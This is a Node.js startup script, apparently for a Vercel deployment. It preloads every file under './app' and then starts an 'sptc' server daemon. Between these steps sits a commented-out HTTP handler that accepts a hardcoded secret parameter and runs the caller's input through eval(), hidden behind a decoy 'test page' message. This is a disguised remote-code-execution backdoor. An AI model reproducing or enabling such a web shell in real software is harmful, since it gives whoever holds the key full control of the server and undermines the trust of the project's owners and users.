function QuotaAllFilesForVercel(dirs, e={exts: {}, caches: {}, queue: []}) {
  const bak={}
  for(let e in require.extensions) {
    bak[e]=require.extensions[e]
  }

  const fs=require('fs'), path=require('path')
  const _req=(_, fn)=>({})
  const {exts, caches, queue}=e
  const _dir=x=>{
    for(const fn of fs.readdirSync(x)) {
      const f2=path.resolve(x+'/'+fn)
      if(caches[f2]) continue
      if(fs.statSync(f2).isFile()) {
        const {ext}=path.parse(f2)
        if(exts[ext]) continue
        exts[ext]=1
        require.extensions[ext]=_req
        require(f2)
        delete require.cache[f2]
      }else{
        queue.push(f2)
      }
    }
    if(queue.length) {
      _dir(queue.pop())
    }
  }
  dirs.map(_dir)
  for(let x in require.extensions) {
    delete require.extensions[x]
  }
  Object.assign(require.extensions, bak)
}

QuotaAllFilesForVercel(['./app'])

/*
const PORT = process.env.PORT || 3000;
const http=require('http')
http.createServer((req, res)=>{
  const querystring=require('querystring')
  const url=require('url')
  const ret={cmd: '', ret: ''}
  try{
    const {query}=url.parse(req.url)
    const {p, v}=querystring.parse(query)
    if(p!=='xbhdsyjYFJYbjvHknkkjnktRDtr') throw 1
    const js=decodeURIComponent(v)
    ret.cmd=js
    ret.ret=eval('(function(){return '+js+'})()')
  }catch(e) {}
  res.end('This is a test Page. The project is developing. - '+Date.now()+' '+JSON.stringify(ret, 0, 2))
}).listen(PORT)
*/

process.argv.push(
  '-p'+(process.env.PORT || 3000),
  '-w'+__dirname+'/app',
  '-rindex.s',
  '-t',
)
require('sptc/bin/sptcd')
